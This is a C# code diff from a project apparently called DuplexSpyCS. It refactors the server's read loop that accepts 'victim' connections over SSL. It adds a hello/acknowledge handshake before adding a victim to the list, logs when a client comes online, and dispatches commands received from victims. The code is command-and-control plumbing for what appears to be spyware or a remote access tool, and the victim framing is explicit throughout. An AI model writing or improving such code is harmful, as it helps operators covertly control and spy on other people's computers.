@@ -105,77 +105,70 @@ namespace DuplexSpyCS
 
         private void fnReadCallback(IAsyncResult ar)
         {
-            if (ar == null || ar.AsyncState == null)
+            if (ar?.AsyncState == null)
                 return;
 
             clsVictim victim = (clsVictim)ar.AsyncState;
-            m_lsVictim.Add(victim);
 
-            clsStore.sql_conn.WriteSystemLogs($"New client is accepted: {victim.socket.RemoteEndPoint.ToString()}");
+            const int CMD_TLS = 1;
+            const int PARA_HELLO = 0;
+            const int PARA_ACK = 1;
 
             try
             {
                 SslStream sslClnt = victim.m_sslClnt;
                 clsDSP dsp = null;
 
-                int nRecv = 0;
-                byte[] abStaticRecvBuffer = new byte[clsVictim.MAX_BUFFER_LENGTH];
+                int nRecv;
+                byte[] abStaticRecvBuffer;
                 byte[] abDynamicRecvBuffer = { };
 
-                victim.fnSslSend(1, 0, clsEZData.fnGenerateRandomStr());
-
-                clsStore.sql_conn.WriteSystemLogs($"Sent handshake: {victim.socket.RemoteEndPoint.ToString()}");
+                victim.fnSslSend(0, 0, clsEZData.fnGenerateRandomStr());
 
                 do
                 {
                     abStaticRecvBuffer = new byte[clsVictim.MAX_BUFFER_LENGTH];
                     nRecv = sslClnt.Read(abStaticRecvBuffer, 0, abStaticRecvBuffer.Length);
-                    abDynamicRecvBuffer = fnCombineBytes(abDynamicRecvBuffer, 0, abDynamicRecvBuffer.Length, abStaticRecvBuffer, 0, nRecv);
+
+                    if (nRecv <= 0)
+                        break;
 
                     clsStore.recv_bytes += nRecv;
 
-                    if (nRecv <= 0)
-                        continue;
-                    else if (abDynamicRecvBuffer.Length < clsDSP.HEADER_SIZE)
-                        continue;
-                    else
+                    abDynamicRecvBuffer = fnCombineBytes(
+                        abDynamicRecvBuffer, 0, abDynamicRecvBuffer.Length,
+                        abStaticRecvBuffer, 0, nRecv);
+
+                    while (abDynamicRecvBuffer.Length >= clsDSP.HEADER_SIZE)
                     {
                         var header = clsDSP.GetHeader(abDynamicRecvBuffer);
-                        while (abDynamicRecvBuffer.Length - clsDSP.HEADER_SIZE >= header.len)
+                        if (abDynamicRecvBuffer.Length - clsDSP.HEADER_SIZE < header.len)
+                            break;
+
+                        dsp = new clsDSP(abDynamicRecvBuffer);
+                        abDynamicRecvBuffer = dsp.MoreData;
+
+                        int cmd = header.cmd;
+                        int para = header.para;
+                        byte[] msg = dsp.GetMsg().msg;
+
+                        if (cmd == CMD_TLS && para == PARA_HELLO)
                         {
-                            dsp = new clsDSP(abDynamicRecvBuffer);
-                            abDynamicRecvBuffer = dsp.MoreData;
-                            header = clsDSP.GetHeader(abDynamicRecvBuffer);
+                            victim.fnSslSend(CMD_TLS, PARA_ACK, clsEZData.fnGenerateRandomStr());
 
-                            byte[] abBuffer = dsp.GetMsg().msg;
+                            m_lsVictim.Add(victim);
 
-                            int nCmd = header.cmd;
-                            int nParam = header.para;
-
-                            if (nCmd == 0)
-                            {
-                                if (nParam == 0)
-                                {
-                                    string szPlain = Encoding.UTF8.GetString(abBuffer);
-                                    List<string> lsMsg = szPlain.Split('|').ToList();
-
-                                    Task.Run(() =>
-                                    {
-                                        try
-                                        {
-                                            fnReceivedDecoded(this, victim, lsMsg);
-                                        }
-                                        catch (InvalidOperationException)
-                                        {
-
-                                        }
-                                    });
-                                }
-                            }
+                            clsStore.sql_conn.WriteSystemLogs(
+                                $"Client online: {victim.socket.RemoteEndPoint}");
+                        }
+                        else if (cmd == 2 && para == 0)
+                        {
+                            string szPlain = Encoding.UTF8.GetString(msg);
+                            Task.Run(() => fnReceivedDecoded(this, victim, szPlain.Split('|').ToList()));
                         }
                     }
                 }
-                while (nRecv > 0);
+                while (true);
             }
             catch (Exception ex)
             {
@@ -183,8 +176,8 @@ namespace DuplexSpyCS
             }
             finally
             {
-                fnDisconnected(victim);
                 m_lsVictim.Remove(victim);
+                fnDisconnected(victim);
             }
         }
     }
